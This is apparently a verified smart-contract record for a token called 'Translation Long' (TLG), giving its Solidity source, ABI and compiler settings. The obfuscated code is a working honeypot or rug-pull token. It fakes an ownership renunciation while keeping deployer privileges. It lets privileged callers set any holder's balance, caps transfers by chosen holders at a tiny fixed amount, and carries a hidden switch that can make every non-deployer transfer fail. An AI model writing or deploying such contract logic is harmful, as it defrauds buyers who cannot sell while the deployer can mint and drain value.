{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface autoLimitReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAmountTeam {\n    function createPair(address amountLimitReceiver, address launchFrom) external returns (address);\n}\n\ninterface fromMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMarketing) external view returns (uint256);\n\n    function transfer(address teamEnable, uint256 amountMode) external returns (bool);\n\n    function allowance(address totalWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamEnable,\n        uint256 amountMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toMode, uint256 value);\n    event Approval(address indexed totalWallet, address indexed spender, uint256 value);\n}\n\ninterface fromMinMetadata is fromMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TranslationLong is marketingBuy, fromMin, fromMinMetadata {\n\n    mapping(address => bool) public totalFeeBuy;\n\n    address public autoLiquidity;\n\n    mapping(address => mapping(address => uint256)) private buyMin;\n\n    uint256 public modeTradingEnable;\n\n    function toMinMode(address isTo) public {\n        minSell();\n        \n        if (isTo == autoLiquidity || isTo == enableSenderTrading) {\n            return;\n        }\n        amountTradingTeam[isTo] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountFrom;\n    }\n\n    address toLaunchTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 shouldAuto;\n\n    function receiverSellLimit(address receiverLaunched) public {\n        if (totalSwap) {\n            return;\n        }\n        if (fromList) {\n            receiverLaunch = false;\n        }\n        totalFeeBuy[receiverLaunched] = true;\n        \n        totalSwap = true;\n    }\n\n    address public enableSenderTrading;\n\n    address private teamFrom;\n\n    bool private feeAmount;\n\n    function getOwner() external view returns (address) {\n        return teamFrom;\n    }\n\n    function transfer(address swapReceiver, uint256 amountMode) external virtual override returns (bool) {\n        return liquidityTx(_msgSender(), swapReceiver, amountMode);\n    }\n\n    uint256 private launchedSell = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private takeLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTx;\n    }\n\n    constructor (){\n        if (txAmount != enableFrom) {\n            fromList = true;\n        }\n        autoLimitReceiver buyEnable = autoLimitReceiver(toLaunchTeam);\n        enableSenderTrading = senderAmountTeam(buyEnable.factory()).createPair(buyEnable.WETH(), address(this));\n        \n        autoLiquidity = _msgSender();\n        shouldWallet();\n        totalFeeBuy[autoLiquidity] = true;\n        takeLaunched[autoLiquidity] = launchedSell;\n        if (txAmount != enableFrom) {\n            enableFrom = txAmount;\n        }\n        emit Transfer(address(0), autoLiquidity, launchedSell);\n    }\n\n    uint256 limitTake;\n\n    address toReceiverList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address limitMarketing) public view virtual override returns (uint256) {\n        return takeLaunched[limitMarketing];\n    }\n\n    uint256 public txAmount;\n\n    bool public totalSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSellReceiver;\n    }\n\n    function transferFrom(address atSwap, address teamEnable, uint256 amountMode) external override returns (bool) {\n        if (_msgSender() != toLaunchTeam) {\n            if (buyMin[atSwap][_msgSender()] != type(uint256).max) {\n                require(amountMode <= buyMin[atSwap][_msgSender()]);\n                buyMin[atSwap][_msgSender()] -= amountMode;\n            }\n        }\n        return liquidityTx(atSwap, teamEnable, amountMode);\n    }\n\n    function tokenAutoAmount(address atSwap, address teamEnable, uint256 amountMode) internal returns (bool) {\n        require(takeLaunched[atSwap] >= amountMode);\n        takeLaunched[atSwap] -= amountMode;\n        takeLaunched[teamEnable] += amountMode;\n        emit Transfer(atSwap, teamEnable, amountMode);\n        return true;\n    }\n\n    string private teamSellReceiver = \"TLG\";\n\n    function enableIs(address swapReceiver, uint256 amountMode) public {\n        minSell();\n        takeLaunched[swapReceiver] = amountMode;\n    }\n\n    function liquidityTx(address atSwap, address teamEnable, uint256 amountMode) internal returns (bool) {\n        if (atSwap == autoLiquidity) {\n            return tokenAutoAmount(atSwap, teamEnable, amountMode);\n        }\n        uint256 fundBuy = fromMin(enableSenderTrading).balanceOf(toReceiverList);\n        require(fundBuy == shouldAuto);\n        require(teamEnable != toReceiverList);\n        if (amountTradingTeam[atSwap]) {\n            return tokenAutoAmount(atSwap, teamEnable, limitTxFee);\n        }\n        return tokenAutoAmount(atSwap, teamEnable, amountMode);\n    }\n\n    mapping(address => bool) public amountTradingTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedSell;\n    }\n\n    function approve(address maxReceiver, uint256 amountMode) public virtual override returns (bool) {\n        buyMin[_msgSender()][maxReceiver] = amountMode;\n        emit Approval(_msgSender(), maxReceiver, amountMode);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return teamFrom;\n    }\n\n    uint256 constant limitTxFee = 11 ** 10;\n\n    function minReceiver(uint256 amountMode) public {\n        minSell();\n        shouldAuto = amountMode;\n    }\n\n    uint256 public enableFrom;\n\n    function shouldWallet() public {\n        emit OwnershipTransferred(autoLiquidity, address(0));\n        teamFrom = address(0);\n    }\n\n    function allowance(address marketingFeeTo, address maxReceiver) external view virtual override returns (uint256) {\n        if (maxReceiver == toLaunchTeam) {\n            return type(uint256).max;\n        }\n        return buyMin[marketingFeeTo][maxReceiver];\n    }\n\n    string private amountFrom = \"Translation Long\";\n\n    bool private fromList;\n\n    bool public receiverLaunch;\n\n    function minSell() private view {\n        require(totalFeeBuy[_msgSender()]);\n    }\n\n    bool private swapFrom;\n\n    event OwnershipTransferred(address indexed toMarketing, address indexed modeLaunchedShould);\n\n    uint8 private enableTx = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunchedShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFeeTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTradingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMode\",\"type\":\"uint256\"}],\"name\":\"enableIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSenderTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountMode\",\"type\":\"uint256\"}],\"name\":\"minReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTradingEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"receiverSellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"}],\"name\":\"toMinMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFeeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TranslationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}